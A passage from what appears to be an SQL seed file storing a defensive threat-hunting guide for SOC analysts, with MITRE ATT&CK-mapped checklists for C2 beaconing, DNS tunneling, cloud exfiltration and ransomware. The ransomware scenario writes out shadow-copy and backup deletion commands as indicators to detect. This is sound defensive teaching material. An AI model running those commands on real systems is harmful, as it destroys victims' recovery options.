   □ Check for persistence mechanism keeping the beacon alive

4. TLS/SSL INSPECTION
   □ If SSL inspection is available: inspect traffic content
   □ Check for unusual certificate properties (self-signed, short validity)
   □ Check certificate issuer and subject name
   □ Small POST requests (command check-in) → larger responses (commands)

5. RESPOND
   □ Block the domain and IP at firewall/proxy immediately
   □ DO NOT alert the user first — isolate endpoint silently
   □ Capture memory dump of the beaconing process
   □ Isolate the endpoint from the network
   □ Identify the malware/implant type (Cobalt Strike? Custom?)
   □ Search for same domain/IP/JA3 across all endpoints
   □ Check for lateral movement from this host
   □ Full forensic investigation
   □ Add IOCs to threat intel platform
```

**TP Confidence:** 🔴 CRITICAL — Regular beacon interval to new domain on VPS = confirmed C2 communication.

#### ✅ True Positive Scenario — DNS Tunneling C2 (T1071.004)

**Scenario:** DNS monitoring reveals a workstation sending 500+ DNS TXT queries per hour to subdomains of `update-check[.]xyz`. Subdomain labels are 60+ character Base64-encoded strings like: `dGhpcyBpcyBlbmNvZGVkIGRhdGE.update-check[.]xyz`

**Investigation Steps:**
```
1. CONFIRM DNS TUNNELING
   □ 500+ queries/hour to single domain → abnormal → 🔴
   □ Long subdomain labels (60+ chars) with Base64 encoding → DATA IN DNS
   □ TXT record queries → response carries C2 commands
   □ This is textbook DNS tunneling (dnscat2, iodine, Cobalt Strike DNS)

2. DECODE THE DATA
   □ Base64 decode subdomain labels → what data is being sent?
   □ Is it command output? Credential data? File contents?
   □ Check TXT responses → are C2 commands embedded?

3. ENDPOINT INVESTIGATION
   □ What process is generating DNS queries? (Sysmon Event 22 or Event 3)
   □ Is it a known DNS tunneling tool or custom implant?
   □ Check process tree and persistence
   □ When did the tunneling start? (first query timestamp)

4. NETWORK SCOPE
   □ Are other hosts querying the same domain?
   □ Does your DNS server forward to upstream? (queries visible there too)
   □ Calculate total data volume transferred via DNS

5. RESPOND
   □ Block the domain at DNS resolver (sinkhole to internal server)
   □ Isolate the endpoint
   □ Capture the DNS tunneling tool for analysis
   □ Create DNS analytics: flag domains with high query volume + long labels
   □ Consider DNS query length restrictions at resolver
   □ Deploy DNS security solution (DNS firewall/RPZ)
```

**TP Confidence:** 🔴 CRITICAL — High-volume encoded DNS queries to single domain = confirmed DNS tunneling C2.

---

## 16. TA0010 — Exfiltration

#### Overview
The adversary's **end goal** — stealing data out of the organization. Exfiltration can use the C2 channel, alternative protocols, or physical media.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1041 | Exfiltration Over C2 Channel | Use existing C2 to extract data | C2 detection + data volume |
| T1048 | Exfiltration Over Alternative Protocol | FTP, SFTP, DNS, SMTP | Network logs, DLP |
| T1567 | Exfiltration to Cloud Storage | Upload to Dropbox, OneDrive, Mega | Proxy, CASB, DLP |
| T1029 | Scheduled Transfer | Timed data transfers | Network anomaly, schedule |
| T1030 | Data Transfer Size Limits | Small chunks to avoid detection | Network anomaly |
| T1052 | Exfiltration Over Physical Medium | USB, portable drives | USB audit logs, DLP |
| T1537 | Transfer Data to Cloud Account | Upload to attacker's cloud | Cloud audit logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Large outbound transfers | Firewall/Proxy | Uploads > 100MB to external IPs/domains, especially after-hours |
| Cloud storage uploads | Proxy/CASB | Bulk uploads to personal Dropbox, Google Drive, Mega.nz |
| DNS exfiltration | DNS logs | Encoded data in subdomain labels (same as DNS C2) |
| Email exfiltration | Email gateway | Emails with large/numerous attachments to personal addresses |
| USB data copy | USB audit/DLP | Large file copies to removable media |
| Encrypted uploads | Proxy | Large HTTPS POSTs to unknown/new domains |
| Scheduled FTP | Firewall | Recurring FTP/SFTP connections to external at same time |

#### ✅ True Positive Scenario — Exfiltration to Cloud Storage (T1567)

**Scenario:** CASB alerts that user `s.contractor` uploaded 4.2 GB of data to a personal Mega.nz account during 1 AM - 3 AM. The data consists of 340 files from the Engineering share.

**Investigation Steps:**
```
1. CONFIRM ABNORMAL UPLOAD
   □ 4.2 GB upload to personal cloud storage → 🔴
   □ Mega.nz = encrypted cloud, popular for exfil
   □ 1-3 AM = outside business hours → suspicious timing
   □ Contractor account accessing Engineering data → policy violation at minimum

2. ANALYZE THE DATA
   □ What 340 files were uploaded? (DLP/CASB file listing)
   □ Classification: PII, trade secrets, source code, financial?
   □ Were files downloaded from Engineering share first? (Event 5145)
   □ Were files staged/archived before upload?

3. INVESTIGATE THE ACCOUNT
   □ Is s.contractor still an active contractor?
   □ Is this their typical work pattern?
   □ Check login history: was the account compromised?
   □ Check for impossible travel or unusual login source
   □ Interview the contractor (via HR/Legal)

4. DETERMINE INTENT: INSIDER THREAT vs. EXTERNAL COMPROMISE
   □ If contractor's account was hacked → external actor using their access
   □ If contractor intentionally exfiltrated → insider threat
   □ Check if contractor gave notice recently or has grievances
   □ Check for other data hoarding behavior in recent weeks

5. RESPOND
   □ Disable the contractor's account immediately
   □ Block Mega.nz at proxy (or at least personal accounts)
   □ Notify Legal, HR, and CISO about potential data breach
   □ Preserve all audit logs as evidence
   □ Request Mega.nz account takedown (through legal channels)
   □ Assess regulatory impact (GDPR, CCPA, export controls)
   □ Initiate incident response for data breach
   □ Review all contractor access permissions
```

**TP Confidence:** 🔴 CRITICAL — 4.2 GB upload to personal cloud at 1 AM by contractor = confirmed data exfiltration.

---

## 17. TA0040 — Impact

#### Overview
Adversaries may **destroy, encrypt, or disrupt** systems and data. This includes ransomware, data wiping, defacement, and denial of service. Impact is the **most visible** tactic — it's when the attack reaches its destructive conclusion.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1486 | Data Encrypted for Impact | Ransomware encryption | EDR, File integrity |
| T1485 | Data Destruction | Delete/overwrite data | EDR, File integrity |
| T1490 | Inhibit System Recovery | Delete shadow copies, backups | Event 4688 (vssadmin, wbadmin) |
| T1489 | Service Stop | Stop critical services | Event 7036 |
| T1491 | Defacement | Modify web content | File integrity, Web monitoring |
| T1561 | Disk Wipe | Wipe MBR or disk content | EDR, Boot sector monitoring |
| T1529 | System Shutdown/Reboot | Force reboot after encryption | Event 1074 |
| T1498 | Network Denial of Service | DDoS attacks | Network monitoring |

#### ✅ True Positive Scenario — Ransomware Pre-Deployment (T1486 + T1490)

**Scenario:** Multiple servers simultaneously execute:
```
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
wbadmin delete catalog -quiet
```
Followed by a new executable `svc_update.exe` dropping ransom notes named `RECOVER-FILES.txt` in multiple directories.

**Investigation Steps:**
```
1. IMMEDIATE — THIS IS AN ACTIVE RANSOMWARE ATTACK
   □ Shadow copy deletion + recovery disabled = pre-encryption → 🔴 CRITICAL
   □ Ransom note deployment = ACTIVE RANSOMWARE
   □ Time is critical — every second, more files encrypt
   □ ACTIVATE INCIDENT RESPONSE PLAN IMMEDIATELY

2. CONTAIN — FIRST PRIORITY (Minutes matter)
   □ Isolate ALL affected servers from network immediately
   □ Disable the account executing the ransomware
   □ Block the ransomware hash at EDR (auto-quarantine)
   □ Disconnect network segments to prevent spread
   □ Shut down shares (SMB) to prevent lateral encryption
   □ DO NOT shut down encrypted servers (memory forensics possible)

3. SCOPE THE ATTACK
   □ How many servers are affected?
   □ What data has been encrypted? Is it recoverable from backup?
   □ Are backups intact? (attackers often target backups first)
   □ Has the ransomware spread to workstations?
   □ Are domain controllers compromised?

4. INVESTIGATE THE KILL CHAIN
   □ How did the attacker get in? (Initial Access — check past days/weeks)
   □ How long has the attacker been in the environment? (dwell time)
   □ What credentials were compromised?
   □ What persistence was established? (must be removed before recovery)
   □ Was data exfiltrated BEFORE encryption? (double extortion)

5. RESPOND & RECOVER
   □ Engage executive leadership and legal counsel
   □ Contact cyber insurance provider
   □ Engage incident response firm (if needed)
   □ Determine ransom demand and payment policy
   □ Identify ransomware variant (ID Ransomware, check for decryptors)
   □ Begin restoration from clean backups (verify integrity first)
   □ Rebuild compromised systems from clean images
   □ Reset ALL passwords (assume complete credential compromise)
   □ Reset KRBTGT password (twice, 12-hour interval)
   □ Implement all missing security controls before reconnecting
   □ Post-incident: complete lessons learned review
```

**TP Confidence:** 🔴 CRITICAL — Shadow copy deletion + ransom notes = ACTIVE RANSOMWARE ATTACK. Maximum severity.

---

## 18. Master Investigation Playbooks

### 18.1 Full Attack Chain Investigation Playbook

When you discover a confirmed compromise, use this playbook to investigate the **complete kill chain**:

```
┌──────────────────────────────────────────────────────────────────────────┐
│            FULL KILL CHAIN INVESTIGATION PLAYBOOK                        │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  STEP 1: ESTABLISH TIMELINE                                              │
│  □ When was the FIRST indicator of compromise?                          │
│  □ Build timeline: initial access → current state                       │
│  □ Use SIEM, EDR, and network logs to reconstruct events               │
│  □ Create visual timeline in investigation notes                        │
│                                                                          │
│  STEP 2: IDENTIFY INITIAL ACCESS (TA0001)                               │
│  □ How did the attacker get in? Phishing? Exploit? Stolen creds?       │
│  □ What was the first compromised system/account?                       │
│  □ When exactly did initial access occur?                                │
│                                                                          │
│  STEP 3: MAP EXECUTION (TA0002)                                         │
│  □ What was executed on the first compromised system?                   │
│  □ What tools did the attacker deploy?                                  │
│  □ Was it a known malware family or custom tooling?                     │
│                                                                          │
│  STEP 4: IDENTIFY PERSISTENCE (TA0003)                                  │
│  □ What persistence mechanisms were installed?                           │
│  □ Check: scheduled tasks, services, registry, startup, web shells     │
│  □ ALL persistence must be removed before recovery                      │
│                                                                          │
│  STEP 5: MAP PRIVILEGE ESCALATION (TA0004)                              │
│  □ How did the attacker escalate privileges?                            │
│  □ What is the highest privilege level achieved?                        │
│  □ Are domain admin credentials compromised?                            │
│                                                                          │
│  STEP 6: IDENTIFY CREDENTIAL ACCESS (TA0006)                           │
│  □ Were credentials dumped? Which accounts?                             │
│  □ Was DCSync performed?                                                │
│  □ All compromised credentials must be reset                            │
│                                                                          │
│  STEP 7: MAP LATERAL MOVEMENT (TA0008)                                  │
│  □ What systems did the attacker move to?                               │
│  □ What methods? (RDP, PsExec, WMI, WinRM, PTH)                       │
│  □ Complete inventory of ALL touched systems                            │
│                                                                          │
│  STEP 8: ASSESS DATA IMPACT (TA0009 + TA0010)                          │
│  □ Was data collected/staged?                                           │
│  □ Was data exfiltrated? To where? How much?                            │
│  □ What is the business/regulatory impact?                              │
│                                                                          │
│  STEP 9: CHECK FOR IMPACT (TA0040)                                      │
│  □ Was data destroyed or encrypted?                                     │
│  □ Were recovery mechanisms disabled?                                   │
│  □ What is the operational impact?                                      │
│                                                                          │
│  STEP 10: ERADICATE & RECOVER                                           │
│  □ Remove ALL persistence mechanisms                                    │
│  □ Reset ALL compromised credentials                                    │
│  □ Patch exploited vulnerabilities                                      │
│  □ Rebuild compromised systems                                          │
│  □ Restore from clean backups                                           │
│  □ Verify no attacker access remains                                    │
│  □ Enhanced monitoring for re-compromise                                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 18.2 Key Windows Event IDs for Threat Hunting — Quick Reference

| Event ID | Log | Description | MITRE Tactic |
|----------|-----|-------------|--------------|
| **1** (Sysmon) | Sysmon | Process Creation | Execution, Discovery |
| **3** (Sysmon) | Sysmon | Network Connection | C2, Lateral Movement |
| **7** (Sysmon) | Sysmon | Image Loaded (DLL) | Defense Evasion |
| **8** (Sysmon) | Sysmon | CreateRemoteThread | Priv Esc, Defense Evasion |
| **10** (Sysmon) | Sysmon | Process Access | Credential Access |
| **11** (Sysmon) | Sysmon | File Create | Persistence, Collection |
| **13** (Sysmon) | Sysmon | Registry Modification | Persistence, Defense Evasion |
| **22** (Sysmon) | Sysmon | DNS Query | C2, Discovery |
| **1102** | Security | Audit Log Cleared | Defense Evasion |
| **4624** | Security | Successful Logon | Initial Access, Lat. Movement |
| **4625** | Security | Failed Logon | Credential Access (Brute Force) |
| **4648** | Security | Explicit Credential Logon | Lateral Movement |
| **4662** | Security | Object Access (AD) | Credential Access (DCSync) |
| **4672** | Security | Special Privileges Assigned | Privilege Escalation |
| **4688** | Security | Process Creation | Execution, Discovery |
| **4697** | Security | Service Installed | Persistence |
| **4698** | Security | Scheduled Task Created | Persistence |
| **4720** | Security | User Account Created | Persistence |
| **4728/4732** | Security | Member Added to Group | Privilege Escalation |
| **4769** | Security | Kerberos TGS Request | Credential Access |
| **5140** | Security | Network Share Access | Lateral Movement, Collection |
| **5145** | Security | Detailed Share Access | Lateral Movement, Collection |
| **7036** | System | Service State Change | Impact (Service Stop) |
| **7045** | System | Service Installed | Persistence, Lateral Movement |
| **4104** | PowerShell | Script Block Logging | Execution |

### 18.3 IOC Types to Collect and Share

| IOC Type | Examples | Where to Find |
|----------|---------|---------------|
| **IP Addresses** | C2 server IPs, scanner IPs | Firewall, proxy, Sysmon Event 3 |
| **Domains** | C2 domains, phishing domains | DNS logs, proxy, email headers |
| **URLs** | Payload URLs, phishing URLs | Proxy, email body, script content |
| **File Hashes** | Malware hashes (MD5, SHA1, SHA256) | EDR, Sysmon Event 11, file analysis |
| **Email Addresses** | Attacker sender addresses | Email headers |
| **File Names/Paths** | Malware file names, persistence paths | EDR, Sysmon, file system |
| **Registry Keys** | Persistence registry entries | Sysmon Event 13, registry audit |
| **User Agents** | C2 beacon user agents | Proxy logs |
| **JA3/JA3S Hashes** | TLS fingerprints of C2 | Network sensor, SSL inspection |
| **YARA Rules** | Pattern-based malware detection | Custom creation from analysis |
| **Sigma Rules** | Log-based detection rules | Custom creation from hunting |

---

## 19. Threat Hunting Report Template

```
═══════════════════════════════════════════════════════════
              THREAT HUNTING REPORT
═══════════════════════════════════════════════════════════

Hunt ID:            TH-YYYY-MM-###
Hunt Name:          [Descriptive Name]
Hunter:             [Analyst Name]
Date:               [Start Date] — [End Date]
Status:             [Active / Completed / Escalated to IR]

───────────────────────────────────────────────────────────
HYPOTHESIS
───────────────────────────────────────────────────────────
[What were you looking for and why?]

MITRE ATT&CK Mapping:
  Tactic:     [e.g., Persistence]
  Technique:  [e.g., T1053.005 — Scheduled Task]

Trigger:
  □ Intelligence-driven (cite report/advisory)
  □ Hypothesis-driven (cite reasoning)
  □ Anomaly-driven (cite data pattern)

───────────────────────────────────────────────────────────
DATA SOURCES & QUERIES
───────────────────────────────────────────────────────────
Data Sources Used:
  □ SIEM (Splunk / Sentinel / QRadar)
  □ EDR (CrowdStrike / Defender / SentinelOne)
  □ Firewall / Proxy / DNS
  □ Active Directory / Azure AD
  □ Other: ____________

Key Queries:
  [Paste actual SIEM/EDR queries used]

Time Range Searched:  [e.g., Last 30 days]
Scope:               [e.g., All endpoints / Servers only]

───────────────────────────────────────────────────────────
FINDINGS
───────────────────────────────────────────────────────────
Result:  □ Positive (Threat Found)  □ Negative (No Threat)

If Positive:
  Summary:        [Brief description of finding]
  Severity:       [Critical / High / Medium / Low]
  Affected Assets: [List hosts, users, services]
  IOCs Found:     [List IPs, domains, hashes]
  Timeline:       [Attack timeline]

If Negative:
  Conclusion:     [Why no threat was found]
  Coverage Gaps:  [Any data sources missing?]

───────────────────────────────────────────────────────────
ACTIONS TAKEN
───────────────────────────────────────────────────────────
  □ Escalated to Incident Response (IR-YYYY-###)
  □ IOCs submitted to threat intel platform
  □ New SIEM detection rule created (Rule ID: ___)
  □ Sigma/YARA rule written
  □ Tuned existing detection rules
  □ Reported to management
  □ No action required

───────────────────────────────────────────────────────────
RECOMMENDATIONS
───────────────────────────────────────────────────────────
  [What should the organization do to improve defenses?]

═══════════════════════════════════════════════════════════
```

---

## 20. Top 10 High-Value Hunts Every SOC Should Run Regularly

| # | Hunt | MITRE Technique | Frequency | Difficulty |
|---|------|----------------|-----------|------------|
| 1 | **Encoded PowerShell execution** | T1059.001 | Weekly | Medium |
| 2 | **LSASS access by non-system processes** | T1003.001 | Weekly | Medium |
| 3 | **Beaconing detection (interval analysis)** | T1071 | Weekly | Hard |
| 4 | **New scheduled tasks on DCs/servers** | T1053.005 | Daily | Easy |
| 5 | **Admin share (C$/ADMIN$) access from workstations** | T1021.002 | Weekly | Easy |
| 6 | **Event log clearing on critical servers** | T1070.001 | Daily | Easy |
| 7 | **Kerberoasting (mass TGS requests)** | T1558.003 | Weekly | Medium |
| 8 | **Office apps spawning command shells** | T1204.002 | Daily | Easy |
| 9 | **DNS query anomalies (high entropy, long labels)** | T1071.004 | Weekly | Hard |
| 10 | **Large outbound data transfers after-hours** | T1041/T1567 | Daily | Medium |

---

*End of Threat Hunting SOC Guide (Parts 1-4). This guide covers all 14 MITRE ATT&CK Enterprise tactics with real-world True Positive scenarios, step-by-step investigation procedures, detection checklists, and SOC analyst playbooks.*


---$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Threat_Hunting_SOC_Guide_Part1$VELSEC$, $VELSEC$Threat Hunting Soc Guide Part1$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 🎯 Threat Hunting SOC Guide — Part 1: MITRE ATT&CK Framework, Methodologies & Tactics (Recon → Execution)

---

# PART 1: THREAT HUNTING FUNDAMENTALS & MITRE ATT&CK MAPPED INVESTIGATIONS

---

## 1. What Is Threat Hunting?

### 1.1 Definition

Threat hunting is the **proactive, hypothesis-driven** process of searching through networks, endpoints, and datasets to detect threats that evade existing automated security solutions (SIEM rules, EDR signatures, IDS/IPS). Unlike reactive SOC operations (alert triage), threat hunting **assumes compromise** and actively looks for evidence of adversary activity.

### 1.2 Threat Hunting vs. Alert Triage

| Aspect | Alert Triage (Reactive) | Threat Hunting (Proactive) |
|--------|------------------------|---------------------------|
| **Trigger** | Automated alert fires | Hypothesis or intelligence-driven |
| **Approach** | Investigate what the system detected | Search for what the system **missed** |
| **Mindset** | "Is this alert real?" | "What threats are hiding in our environment?" |
| **Scope** | Single alert/event | Environment-wide or campaign-focused |
| **Output** | TP/FP verdict + response | New detections, IOCs, improved visibility |
| **Frequency** | Continuous (as alerts come in) | Scheduled or triggered by intel |
| **Skill Level** | L1-L2 SOC Analysts | L2-L3 Analysts, Threat Hunters |
| **Tools** | SIEM, EDR alerts | SIEM queries, EDR telemetry, threat intel, custom scripts |

### 1.3 The Three Hunting Models

```
┌──────────────────────────────────────────────────────────────────────┐
│                    THREAT HUNTING MODELS                              │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. INTEL-DRIVEN (Reactive Hunting)                                  │
│     ├─ Triggered by: New threat intelligence (IOCs, reports, CVEs)   │
│     ├─ Method: Search for known IOCs across environment              │
│     ├─ Example: New APT report → search for their known C2 IPs      │
│     └─ Maturity Level: Beginner                                     │
│                                                                      │
│  2. HYPOTHESIS-DRIVEN (Proactive Hunting)                            │
│     ├─ Triggered by: Analyst intuition + MITRE ATT&CK knowledge     │
│     ├─ Method: Formulate hypothesis → test against data             │
│     ├─ Example: "Attackers may be using LOLBins for lateral movement"│
│     └─ Maturity Level: Intermediate                                  │
│                                                                      │
│  3. DATA-DRIVEN (Analytics-Based)                                    │
│     ├─ Triggered by: Statistical anomalies in baseline data          │
│     ├─ Method: Machine learning, baselining, outlier detection       │
│     ├─ Example: Anomalous DNS query volume from a single host        │
│     └─ Maturity Level: Advanced                                      │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 2. MITRE ATT&CK Framework — Overview for Threat Hunters

### 2.1 What Is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary behavior based on real-world observations. It categorizes **what** adversaries do (Tactics), **how** they do it (Techniques), and specific **implementations** (Sub-techniques/Procedures).

### 2.2 ATT&CK Matrix Structure

```
┌───────────────────────────────────────────────────────────────────────────┐
│                        MITRE ATT&CK ENTERPRISE MATRIX                     │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│   TACTICS (WHY — the adversary's goal)                                    │
│   └─ TECHNIQUES (HOW — the method used to achieve the goal)              │
│       └─ SUB-TECHNIQUES (SPECIFIC — variation of the technique)          │
│           └─ PROCEDURES (IMPLEMENTATION — real-world group usage)         │
│                                                                           │
│   Example:                                                                │
│   Tactic:         Credential Access                                       │
│   Technique:      OS Credential Dumping (T1003)                          │
│   Sub-Technique:  LSASS Memory (T1003.001)                               │
│   Procedure:      APT28 uses Mimikatz to dump LSASS credentials         │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

### 2.3 The 14 ATT&CK Tactics (Enterprise)

| # | Tactic ID | Tactic | Goal | Key Techniques |
|---|-----------|--------|------|----------------|
| 1 | TA0043 | **Reconnaissance** | Gather info for planning | Active/Passive scanning, Phishing for info |
| 2 | TA0042 | **Resource Development** | Establish resources for operations | Acquire infrastructure, Develop capabilities |
| 3 | TA0001 | **Initial Access** | Get into the network | Phishing, Exploit public-facing app, Valid accounts |
| 4 | TA0002 | **Execution** | Run malicious code | PowerShell, WMI, Scripting, Scheduled tasks |
| 5 | TA0003 | **Persistence** | Maintain foothold | Registry Run keys, Scheduled tasks, Account creation |
| 6 | TA0004 | **Privilege Escalation** | Gain higher-level permissions | Token manipulation, Exploitation, UAC bypass |
| 7 | TA0005 | **Defense Evasion** | Avoid detection | Obfuscation, Disabling security, Masquerading |
| 8 | TA0006 | **Credential Access** | Steal credentials | Credential dumping, Keylogging, Brute force |
| 9 | TA0007 | **Discovery** | Explore the environment | Network scanning, Account discovery, System info |
| 10 | TA0008 | **Lateral Movement** | Move through the environment | RDP, SMB, PsExec, WinRM |
| 11 | TA0009 | **Collection** | Gather target data | Screen capture, Keylogging, Email collection |
| 12 | TA0011 | **Command and Control** | Communicate with implants | DNS tunneling, HTTPS C2, Domain fronting |
| 13 | TA0010 | **Exfiltration** | Steal data out | Exfil over C2, Exfil to cloud, Scheduled transfer |
| 14 | TA0040 | **Impact** | Disrupt/Destroy | Ransomware, Data destruction, Defacement |

### 2.4 How Threat Hunters Use MITRE ATT&CK

```
┌──────────────────────────────────────────────────────────────────────┐
│           MITRE ATT&CK FOR THREAT HUNTING WORKFLOW                   │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. MAP DETECTION COVERAGE                                           │
│     ├─ Overlay your SIEM/EDR detections on ATT&CK Matrix            │
│     ├─ Identify GAPS (tactics/techniques with NO detection)          │
│     └─ Prioritize hunting in unmonitored areas                       │
│                                                                      │
│  2. FORMULATE HUNTING HYPOTHESES                                     │
│     ├─ Pick a tactic/technique relevant to your threat model        │
│     ├─ "If adversary does T1059.001 (PowerShell), what traces?"     │
│     └─ Design queries to find those traces                           │
│                                                                      │
│  3. INVESTIGATE RESULTS                                              │
│     ├─ Analyze returned data for true adversary behavior             │
│     ├─ Eliminate false positives (system admins, automation)         │
│     └─ Correlate findings with other tactics in kill chain          │
│                                                                      │
│  4. CREATE / IMPROVE DETECTIONS                                      │
│     ├─ Convert hunting findings into automated SIEM rules           │
│     ├─ Write Sigma rules or KQL queries                              │
│     └─ Document in detection engineering backlog                     │
│                                                                      │
│  5. REPORT & ITERATE                                                 │
│     ├─ Document hunting results (positive or negative)              │
│     ├─ Share IOCs and TTPs with SOC and threat intel team            │
│     └─ Update threat model and repeat cycle                          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Threat Hunting Process — Step by Step

### 3.1 The Hunting Cycle

```
    ┌──────────────┐
    │  1. CREATE    │◄────────────────────────────────┐
    │  HYPOTHESIS   │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 2. GATHER    │                                  │
    │ DATA/LOGS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 3. RUN       │                                  │
    │ ANALYTICS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐         ┌──────────────┐        │
    │ 4. ANALYZE   │────────►│ 5. FINDINGS? │        │
    │ RESULTS      │         │              │        │
    └──────────────┘         └──────┬───────┘        │
                                    │                 │
                              YES   │   NO            │
                               │    │    │            │
                               ▼    │    ▼            │
                         ┌─────────┐│ ┌─────────┐    │
                         │ CREATE  ││ │ REFINE   │    │
                         │ DETECT/ ││ │ HYPOTHESIS│────┘
                         │ RESPOND ││ │ & QUERY  │
                         └─────────┘│ └─────────┘
                                    │
                               ▼    │
                         ┌─────────┐
                         │DOCUMENT │
                         │& SHARE  │
                         └─────────┘
```

### 3.2 Hypothesis Construction Framework

| Component | Description | Example |
|-----------|-------------|---------|
| **Threat Actor** | Who might attack us? | APT29; Ransomware gang; Insider threat |
| **Tactic** | What is their goal? | Persistence; Credential Access |
| **Technique** | How would they achieve it? | T1053 - Scheduled Task; T1003 - Credential Dumping |
| **Data Source** | What logs show this behavior? | Windows Event Logs, EDR telemetry, Sysmon |
| **Expected Evidence** | What would we see in the data? | New scheduled tasks created by non-admin users |
| **Baseline** | What is normal? | IT admin creates scheduled tasks for patching |

**Example Hypothesis:**
> "An adversary may have established persistence in our environment by creating scheduled tasks (T1053.005) to execute malicious payloads. I will search for recently created scheduled tasks by non-standard accounts, created outside of change windows, pointing to unusual binary paths."

### 3.3 Key Data Sources for Hunting

| Data Source | What It Captures | Key Event IDs / Logs |
|-------------|-----------------|---------------------|
| **Windows Event Logs** | Authentication, process execution, PowerShell | 4624, 4625, 4688, 4672, 4720, 4732, 7045 |
| **Sysmon** | Process creation, network connections, file creation | Event 1 (Process Create), 3 (Network), 7 (Image Loaded), 11 (File Create), 13 (Registry) |
| **EDR Telemetry** | Endpoint behavior, process trees, file modifications | CrowdStrike, Defender for Endpoint, SentinelOne |
| **Firewall/Proxy Logs** | Network connections, URL requests, blocked traffic | Connection logs, URL filtering logs |
| **DNS Logs** | Domain resolution queries | Query logs, response logs |
| **Cloud Logs** | Azure AD/Entra, AWS CloudTrail, GCP Audit | Sign-in logs, API calls, IAM changes |
| **Email Logs** | Email flow, attachments, URL clicks | Exchange message trace, SEG logs |
| **Network Flow** | NetFlow/IPFIX data, packet captures | Source/Dest IP, ports, bytes, duration |

---

## 4. MITRE ATT&CK Tactic-by-Tactic Hunting Guide

### 4.1 TA0043 — Reconnaissance

#### Overview
Adversaries gather information about the target before attacking. While most recon happens externally (outside your network), you can detect **active reconnaissance** like port scanning and responses to information-gathering emails.

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1595 | Active Scanning | Port scanning, vulnerability scanning from external IPs |
| T1589 | Gather Victim Identity Info | Harvesting employee names, emails, credentials from public sources |
| T1590 | Gather Victim Network Info | Identifying IP ranges, domains, DNS records |
| T1591 | Gather Victim Org Info | Business relationships, physical locations, roles |
| T1598 | Phishing for Information | Spear-phishing emails designed to gather intel (not deliver malware) |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| External port scanning | Firewall/IDS | High volume of connection attempts from single external IP to multiple ports |
| Reconnaissance phishing | Email gateway | Emails requesting org chart, contact info, technology stack details |
| Web scraping of public assets | Web server logs | Unusual crawling patterns on career pages, leadership pages |
| DNS reconnaissance | DNS logs | High volume of DNS queries for subdomains from external source (subdomain enumeration) |

#### ✅ True Positive Scenario — Active Scanning Detected

**Scenario:** Firewall logs show an external IP (`185.220.101.x`) sent SYN packets to 500+ ports on your DMZ server within 5 minutes.

**Investigation Steps:**
```
1. CONFIRM THE ACTIVITY
   □ Review firewall logs for the source IP
   □ Confirm high port-scan volume (> 100 ports in < 10 min)
   □ Identify targeted assets (what servers/ranges were scanned)

2. ENRICH THE SOURCE IP
   □ Check AbuseIPDB, VirusTotal, Shodan for source IP reputation
   □ Check if IP belongs to known threat actor infrastructure
   □ Check if IP is a TOR exit node or VPN provider
   □ Geolocate the IP

3. ASSESS IMPACT
   □ Were any ports open/responsive?
   □ Did the scanner find any vulnerable services?
   □ Were there follow-up exploitation attempts?
   □ Check IDS/IPS for signature-based alerts from same IP

4. RESPOND
   □ Block the source IP at perimeter firewall
   □ Add IP to threat intel watchlist
   □ Notify vulnerability management team of scanned assets
   □ Verify patch status of exposed services
   □ Monitor for follow-up activity from same IP range

5. DOCUMENT
   □ Log finding in threat hunting report
   □ Create SIEM correlation rule for future scans from this range
   □ Update threat model with targeting information
```

**TP Confidence:** 🔴 HIGH — External entity actively scanning your infrastructure is always a TP for reconnaissance.

---

### 4.2 TA0042 — Resource Development

#### Overview
Adversaries establish infrastructure, acquire tools, and prepare capabilities before the attack. This tactic is **mostly undetectable** from within the target's environment but can be observed through:
- Newly registered domains mimicking your brand
- Infrastructure associated with known threat actors

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1583 | Acquire Infrastructure | Register domains, rent VPS, buy IP ranges |
| T1584 | Compromise Infrastructure | Hack legitimate servers for C2 |
| T1587 | Develop Capabilities | Build custom malware, exploits |
| T1588 | Obtain Capabilities | Download tools like Cobalt Strike, Mimikatz |
| T1585 | Establish Accounts | Create accounts for social engineering |
| T1586 | Compromise Accounts | Take over legitimate accounts for use in ops |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Lookalike domains | Domain monitoring service | Newly registered domains similar to your brand name (typosquats, homoglyphs) |
| Staged tools/payloads | Threat intel feeds | Known malicious tools hosted on infrastructure matching your threat model |
| Compromised infrastructure | Passive DNS | Legitimate domains suddenly resolving to suspicious IPs |

#### ✅ True Positive Scenario — Lookalike Domain Registered

**Scenario:** Domain monitoring service alerts that `yourcompany-login.com` was registered 2 days ago. Passive DNS shows it resolves to a known bulletproof hosting provider.
